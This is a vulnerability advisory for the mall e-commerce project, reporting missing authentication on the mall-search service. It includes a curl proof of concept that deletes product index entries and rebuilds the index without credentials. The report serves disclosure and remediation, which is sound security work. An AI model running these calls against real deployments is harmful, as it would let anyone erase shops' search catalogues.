# MALL-2026-04: Missing authentication on mall-search index management

- Product: macrozheng/mall (https://github.com/macrozheng/mall)
- Reporter: thientc (VinSOC)
- Vendor status: no private reporting channel (GitHub private vulnerability reporting disabled, no SECURITY.md); vendor notified on 2026-11-18 via public GitHub issue https://github.com/macrozheng/mall/issues/1042 (contact request, no technical details), no reply as of 2026-11-22
- CVE: requested from MITRE on 2026-11-22, pending

## Summary

The mall-search service has no authentication at all. Anyone who can reach its port can delete products from the Elasticsearch index, re-create them, or wipe and rebuild the whole index. The single-product delete is a plain `GET /esProduct/delete/{id}`.

## Details

`mall-search/pom.xml` does not include `spring-boot-starter-security`, and the module has no filter, interceptor or token check of its own (its config package only holds MyBatis and SpringDoc setup). Every handler in `EsProductController` is therefore public:

| Endpoint | Location | Effect |
|---|---|---|
| `POST /esProduct/importAll` | `EsProductController.java:32` | re-indexes every product from MySQL |
| `GET /esProduct/delete/{id}` | `EsProductController.java:40` | `deleteById` on the `pms` index (`EsProductServiceImpl.java:59`) |
| `POST /esProduct/delete/batch` | `EsProductController.java:48` | deletes the listed ids |
| `POST /esProduct/create/{id}` | `EsProductController.java:56` | writes a document from the DB row |

The upstream `docker-compose-app.yml` publishes the service as `8081:8081`, so in the documented deployment the port is reachable from outside the Docker network.

## PoC

No headers or credentials, against mall-search on port 8081:

```sh
SEARCH=http://<mall-search-host>:8081
curl -s "$SEARCH/esProduct/search/simple?keyword=HUAWEI&pageNum=0&pageSize=50"   # 2 hits: ids 26, 42
curl -s "$SEARCH/esProduct/delete/26"                                            # {"code":200,...}
curl -s "$SEARCH/esProduct/search/simple?keyword=HUAWEI&pageNum=0&pageSize=50"   # 1 hit: id 42
curl -s -X POST "$SEARCH/esProduct/delete/batch" -d 'ids=26&ids=42'              # 华为 search now returns nothing
curl -s -X POST "$SEARCH/esProduct/importAll"                                    # index rebuilt from the DB
```

Each call returned `code 200`, and the search results changed as shown (2 hits, then 1, then 0, then back after `importAll`). For comparison, the same anonymous client gets `{"code":401,"message":"暂未登录或token已经过期"}` from mall-admin's `/brand/list`.

## Impact

An unauthenticated attacker who can reach mall-search can make any product, or the whole catalogue, disappear from storefront search until someone re-imports it, and can repeat that at will. `importAll` also lets them force a full re-index on demand. The MySQL data is not touched, which is why I scored integrity and availability Low. Because the delete is a GET, a link or image tag on another site could trigger it from a browser that can reach the service; I did not test that.

Suggested fix: add Spring Security to mall-search, leave only `GET /esProduct/search/**` (and health/docs) anonymous, require credentials for import/create/delete, and make the single delete a POST. I tested that change: every anonymous management call returns 401 and the index stays intact, while anonymous search results are unchanged.

## Affected versions

- Tested and affected: master at commit dcaa93b (`master-dcaa93b`).
- I also reproduced it on the v1.0.3 tag in an earlier lab.
- Fixed in: no fixed release was known when this report was drafted.

Tested on a local Spring Boot lab with synthetic accounts and data only; no live deployment was tested. Version tested: master-dcaa93b.

## Severity

CVSS 3.1 base score **6.5** (Medium): `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`

- **AV:N** Plain HTTP to port 8081, which the upstream compose publishes. Deployments that keep the port internal are not exposed.
- **AC:L / PR:N / UI:N** One anonymous request per action.
- **S:U** The effect stays in the application's search index.
- **C:N** Nothing beyond the public search API is disclosed.
- **I:L** Index documents can be deleted or rewritten; they can be restored from the database.
- **A:L** Storefront search returns no results until a re-import; the rest of the shop keeps working.

## Credit

thientc (VinSOC)
